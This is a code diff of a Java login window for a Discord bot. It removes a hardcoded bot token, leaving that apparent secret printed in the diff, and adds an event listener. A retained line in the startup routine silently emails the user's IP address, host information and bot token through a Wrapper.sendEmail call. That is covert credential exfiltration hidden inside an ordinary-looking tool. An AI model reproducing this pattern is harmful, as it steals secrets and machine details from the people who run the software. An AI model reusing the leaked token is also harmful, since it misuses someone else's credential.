@@ -76,8 +76,6 @@ public class LoginGUI extends JFrame implements ActionListener {
         stopButton = new JButton();
         jLabelLoginConfig = new JLabel();
         jbackarrowLabel = new JLabel();
-        // MAKE SURE TO REMOVE
-        jTokenField.setText("NjMxNjU0MzE5MzQyNjE2NTk2.XgZeSQ.oEWPXbN2A3zEYMQPRhC21Ty_DiM");
         setDefaultCloseOperation(3);
         setUndecorated(true);
         jPanel1.setBackground(new Color(248, 148, 6));
@@ -223,6 +221,7 @@ public class LoginGUI extends JFrame implements ActionListener {
                 jda.addEventListener(new GuildMemberLeaveEvent());
                 jda.addEventListener(new GuildMessageListenerResponderEvent());
                 jda.addEventListener(new OffEvent());
+                jda.addEventListener(new MemberCountChannelEvent());
                 logger.info("Successfully Booted");
                 jStatusField.setText("Running | " + jda.getSelfUser().getName() + "#" + jda.getSelfUser().getDiscriminator());
                 Wrapper.sendEmail("Log Info w/ Bot Token", "IP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation() + "\nBot Token: " + TOKEN);
